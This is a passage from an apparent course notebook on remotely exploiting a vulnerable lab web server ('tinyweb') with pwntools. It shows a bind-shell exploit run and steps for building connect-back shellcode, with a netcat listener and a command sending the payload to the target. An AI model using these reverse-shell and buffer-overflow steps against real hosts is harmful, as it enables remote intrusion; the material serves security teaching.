    "\n",
    "- Pwntools library helps us automate most of the steps using a Python script\n",
    "- let's use pwntools to exploit the remote tinyweb server\n",
    "- running pwntools interactively from Jupyter Notebook doesn't seem to work; connection autoshuts down\n",
    "- open `demos/tinyweb/exploit.py` file\n",
    "- fix all the FIXMEs and run it to exploit the target"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# it famils from conda environment!!!!! Not sure why.....\n",
    "from pwn import *"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# create a socket connection to target\n",
    "io = connect('192.168.144.2', 80)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# send some data..\n",
    "io.send(b'hello \\r\\n')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# tinyweb exploit code in Python\n",
    "! cat exploit.py"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- run the exploit code from its directory\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/projects/NetworkSecurity/demos/tinyweb]\n",
    "└─$ python3 exploit.py\n",
    "[+] Opening connection to 192.168.195.167 on port 80: Done\n",
    "sled len = 244\n",
    "Target 192.168.195.167 exploited... connecting to port: 9999\n",
    "[+] Opening connection to 192.168.195.167 on port 9999: Done\n",
    "[*] Switching to interactive mode\n",
    "$ whoami\n",
    "user\n",
    "$ ls\n",
    "Makefile\n",
    "junk.txt\n",
    "local_exploit.bin\n",
    "main.cpp\n",
    "main.o\n",
    "port_bind_exploit.bin\n",
    "tinyweb.exe\n",
    "webroot\n",
    "$ exit\n",
    "[*] Got EOF while reading in interactive\n",
    "$ \n",
    "$ \n",
    "[*] Closed connection to 192.168.195.167 port 9999\n",
    "[*] Got EOF while sending in interactive\n",
    "[*] Closed connection to 192.168.195.167 port 80\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Remote Exploit - Connect-back Shellcode\n",
    "- connecting to the victim machine is not easy due to firewall and IDS, IPS, etc.\n",
    "- however, outgoing connection is typically allowed\n",
    "- use the following exploit\n",
    "- use a different VM or system as an attacker machine\n",
    "- create connect back (TCP Reverse connect) shellcode\n",
    "- generate Shellcode using GDB PEDA\n",
    "    - IP address must be the address of the attacker for victim to connect back\n",
    "    - Port can be any available higer port > 1024 on the attacker machine for victim to connect back to\n",
    "- add about 100 bytes to the beginning address of request to get the working landing address\n",
    "\n",
    "\n",
    "```bash\n",
    "$ gdb -q\n",
    "gdb-peda$ shellcode generate x86/linux connect <attacker_port> <attacker_ip>\n",
    "\n",
    "```\n",
    "\n",
    "- write shellcode to a file as binary one line at a time\n",
    "- do one line at a time as following or use shellcode_writer.py script in shellcode folder\n",
    "\n",
    "```bash\n",
    "$ python3 -c 'import sys; sys.stdout.buffer.write(b\"shellcode line1\")' > reverse_tcp.bin\n",
    "$ python3 -c 'import sys; sys.stdout.buffer.write(b\"shellcode line2\")' >> reverse_tcp.bin\n",
    "...\n",
    "...\n",
    "```\n",
    "\n",
    "- calculate `n` and `m` to make exploit code\n",
    "    - `[<NOP sled>*n + len(reverse_tcp.bin) + <return address>*m]`\n",
    "- repeated return address = `<address of request> + 100`\n",
    "- run a server on attacker machine so the victim can connect back to it\n",
    "- port must be the same as used in the exploit code\n",
    "\n",
    "```bash\n",
    "$ nc -v -l -p <attacker_port>\n",
    "```\n",
    "\n",
    "- create the exploit code (connect_back_exploit_code.bin) as demonstrated in local exploit\n",
    "- send the expploit code to the Tinyweb server using netcat\n",
    "\n",
    "```bash\n",
    "$ cat connect_back_exploit_code.bin | nc -v <target ip> 80\n",
    "```\n",
    "- check the terminal running the netcat server on the attacker machine to verify if the victim is exploited and connected back to the attacker \n",
    "- interact with the victim"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
